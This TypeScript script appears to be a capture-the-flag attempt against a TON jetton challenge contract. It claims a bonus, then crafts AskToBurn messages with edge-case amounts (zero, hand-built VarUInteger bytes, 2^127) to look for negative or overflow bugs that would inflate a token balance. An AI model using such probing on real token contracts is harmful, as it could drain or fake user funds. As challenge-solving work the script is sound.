import { TonClient, WalletContractV3R2 } from '@ton/ton';
import { keyPairFromSeed } from '@ton/crypto';
import { Address, toNano, beginCell, SendMode, TupleItem, internal, Cell } from '@ton/core';
import * as fs from 'fs';

const SESSION_FILE = 'session.json';
interface SessionData { uuid: string; challenge: string; api: string; wallet_id: number; seed: string; }
function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)); }

async function getBal(client: TonClient, addr: Address) { return client.getBalance(addr); }
async function getJettonBal(client: TonClient, addr: Address): Promise<bigint | null> {
    try { const r = await client.runMethod(addr, 'get_wallet_data'); return r.stack.readBigNumber(); } catch { return null; }
}

async function sendXfer(openedWallet: any, wallet: any, provider: any, kp: any, msg: any) {
    const seqno = await wallet.getSeqno(provider);
    await openedWallet.sendTransfer({ seqno, secretKey: kp.secretKey, messages: [msg], sendMode: SendMode.PAY_GAS_SEPARATELY });
    for (let w = 0; w < 30; w++) { await sleep(2000); const ns = await wallet.getSeqno(provider); if (ns > seqno) return; }
    throw new Error(`seqno stuck`);
}

async function main() {
    const s: SessionData = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf-8'));
    const client = new TonClient({ endpoint: s.api.replace(/\/+$/, '') + '/jsonRPC', timeout: 30000 });
    const challengeAddr = Address.parse(s.challenge);
    const kp = keyPairFromSeed(Buffer.from(s.seed, 'hex'));
    const wallet = WalletContractV3R2.create({ workchain: -1, publicKey: kp.publicKey, walletId: s.wallet_id });
    const openedWallet = client.open(wallet);
    const provider = client.provider(wallet.address, wallet.init);

    const mr = await client.runMethod(challengeAddr, 'minter');
    const minter = mr.stack.readAddress();
    const pwc = beginCell().storeAddress(wallet.address).endCell();
    const pwr = await client.runMethod(minter, 'get_wallet_address', [{ type: 'slice', cell: pwc } as TupleItem]);
    const pJetton = pwr.stack.readAddress();
    const cwc = beginCell().storeAddress(challengeAddr).endCell();
    const cwr = await client.runMethod(minter, 'get_wallet_address', [{ type: 'slice', cell: cwc } as TupleItem]);
    const cJetton = cwr.stack.readAddress();

    console.log(`Wallet: ${wallet.address}`);
    console.log(`pJetton: ${pJetton}`);
    console.log(`cJetton: ${cJetton}\n`);

    // Claim PlayerBonus
    const bonusBody = beginCell().storeUint(0x13370002, 32).storeUint(0, 64).endCell();
    await sendXfer(openedWallet, wallet, provider, kp, internal({ to: challengeAddr, value: toNano('0.3'), body: bonusBody, bounce: false }));
    await sleep(12000);
    let jet = await getJettonBal(client, pJetton);
    console.log(`After Bonus: Jetton=${jet} TON=${Number(await getBal(client, wallet.address))/1e9}`);

    // === Test negative Burn ===
    // Try to send AskToBurn with negative amount using raw cell encoding
    // AskToBurn opcode: 0x595f07bc
    // Format: op(32) queryId(64) jettonAmount(coins) sendExcessesTo(address?) customPayload(cell?)

    // For coins serialization: VarUInteger 16 — needs manual encoding
    // Encode -1 as a VarUInteger...
    // Actually let's try storeCoins(0) first (burn 0 = no-op)
    // Then try storeCoins with different encodings

    console.log(`\n=== Testing AskToBurn with edge cases ===`);

    // Try 1: Burn 0 (should be a no-op)
    try {
        console.log(`\nTest 1: Burn 0 jettons`);
        const burn0 = beginCell()
            .storeUint(0x595f07bc, 32)
            .storeUint(0, 64)
            .storeCoins(0n) // burn 0
            .storeAddress(null) // sendExcessesTo = null
            .storeBit(0) // no custom payload
            .endCell();
        console.log(`  Body length: ${burn0.bits.length} bits`);
    } catch (e: any) { console.log(`  Error: ${e.message}`); }

    // Try 2: Burn with negative via storeInt
    try {
        console.log(`\nTest 2: Burn with -1 encoded as VarUInteger`);
        // VarUInteger: first byte = length, then data bytes
        // For small values: first byte = 0 (length 1 byte), data = value
        // Can we encode a value after the length byte?
        const negCell = beginCell()
            .storeUint(0x595f07bc, 32)
            .storeUint(0, 64)
            .storeUint(1, 8)  // length = 1 (1 byte follows)
            .storeUint(0xFF, 8) // byte = 255 = -1 in unsigned interpretation?
            .storeAddress(null)
            .storeBit(0)
            .endCell();
        console.log(`  Body bits: ${negCell.bits.length}`);

        // Actually, coins in VarUInteger 16: first 4 bits = len, then len bytes
        // Let me try: length=1, byte=0xFF (unsigned 255, but balance check would fail since 50 < 255)
        // Or length=1, byte=0x01 (value=1, legit burn 1)
    } catch (e: any) { console.log(`  Error: ${e.message}`); }

    // Try 3: Use storeBuilder and build the coins encoding manually
    // From @ton/core source: storeVarUInt(n, 16)
    // VarUInteger encoding: number of bytes prefix (4 bits) + bytes
    console.log(`\nTest 3: Manual VarUInteger encoding`);
    try {
        // For value 1: prefix=0 (1 byte value), then 0x01
        const burn1Body = beginCell()
            .storeUint(0x595f07bc, 32)
            .storeUint(0, 64)
            .storeUint(0, 4) // prefix: 0 = 1 byte follow
            .storeUint(1, 8) // value = 1
            .storeAddress(null)
            .storeBit(0)
            .endCell();
        console.log(`  Burn-1 body: ${burn1Body.bits.length} bits`);

        const before = await getBal(client, wallet.address);
        console.log(`  Sending burn-1 test (seqno=${await wallet.getSeqno(provider)})...`);
        await sendXfer(openedWallet, wallet, provider, kp, internal({ to: pJetton, value: toNano('0.15'), body: burn1Body, bounce: false }));
        await sleep(10000);

        const after = await getJettonBal(client, pJetton);
        console.log(`  Jetton after burn-1: ${after}`);
        console.log(`  TON change: ${Number(await getBal(client, wallet.address) - before)/1e9}`);
    } catch (e: any) { console.log(`  Error: ${e.message.slice(0, 100)}`); }

    // Try 4: Burn with max value to test overflow in balance check
    // coins max in VarUInteger 16: up to 2^120 - 1
    console.log(`\nTest 4: Huge amount`);
    // Max VarUInt16 value: 2^120-1 is unwieldy. Let me try something manageable.
    // What if amount > balance? Should fail the assert.

    // Try 5: Direct storeCoins(n++) to see what the max value limit is
    try {
        console.log(`\nTest 5: storeCoins with 2^127`);
        // This might work or throw depending on @ton/core version
        const bigAmt = 1n << 127n; // 2^127
        const bigBody = beginCell()
            .storeUint(0x595f07bc, 32)
            .storeUint(0, 64)
            .storeCoins(bigAmt)
            .storeAddress(null)
            .storeBit(0)
            .endCell();
        console.log(`  Body bits: ${bigBody.bits.length} (encoded ${bigAmt})`);
    } catch (e: any) { console.log(`  storeCoins(2^127) error: ${e.message}`); }

    // Try 5b: storeCoins with big value
    try {
        console.log(`\nTest 5b: storeCoins with 1000000`);
        const bigBody = beginCell()
            .storeUint(0x595f07bc, 32)
            .storeUint(0, 64)
            .storeCoins(1000000n)
            .storeAddress(null)
            .storeBit(0)
            .endCell();
        console.log(`  Body bits: ${bigBody.bits.length}`);
    } catch (e: any) { console.log(`  Error: ${e.message}`); }

    // === Key test: Try to encode NEGATIVE coins with manual cell ops ===
    console.log(`\n=== Key: AskToTransfer with negative amount? ===`);
    console.log(`Testing if we can encode coins with n=0 (storeUint or storeInt) that bypasses storeCoins type check`);

    // The VarUInteger 16 encoding has a 4-bit prefix for length
    // If we set length=0 then no data bytes, value = 0
    // If we somehow encode negative in the raw data...

    // Actually, let me test: what does storeCoins accept?
    // If storeCoins rejects negative, can I use storeRef + builder trickery?

    // Test: storeUint for each byte of coins encoding
    // VarUInt16: prefix(4 bits) + data(prefix+1 bytes)
    // For value 50: prefix=0, data=0x32
    const coins50 = beginCell().storeCoins(50n).endCell();
    console.log(`\ncoins(50) raw: ${coins50.bits.length} bits, hex: ${coins50.toBoc({ idx: false, crc32: false }).toString('hex').slice(0, 40)}`);

    // Try with 0
    const coins0 = beginCell().storeCoins(0n).endCell();
    console.log(`coins(0) raw:  ${coins0.bits.length} bits, hex: ${coins0.toBoc({ idx: false, crc32: false }).toString('hex').slice(0, 40)}`);

    // Try to brute-force: send AskToBurn with different amounts to find exploitable value
    console.log(`\n=== Summary ===`);
    console.log(`Current: Jetton=${jet}`);
    console.log(`Need >= 100 for Solve.`);
}
main().catch(console.error);
